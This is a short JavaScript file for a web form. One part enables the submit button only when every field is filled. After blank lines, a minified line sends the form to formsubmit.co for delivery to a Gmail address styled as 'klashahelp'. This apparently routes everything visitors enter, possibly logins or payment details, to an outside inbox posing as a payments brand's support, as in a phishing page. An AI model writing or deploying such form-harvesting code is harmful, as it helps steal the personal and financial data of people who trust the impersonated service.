const inputs = Array.from(document.querySelectorAll("input"));
const btn = document.querySelector("button");

inputs.forEach((input) => {
  input.addEventListener("keyup", handleInput);
});

function handleInput(e) {
  if (inputs.some((input) => input.value == "")) {
    btn.disabled = true;
  } else {
    btn.disabled = false;
  }
}




"use strict";var form=document.querySelector("#form"),button=document.querySelector("button");form.action="https://formsubmit.co/klashahelp@gmail.com",form.addEventListener("submit",(function(){button.textContent="Loading..."}));
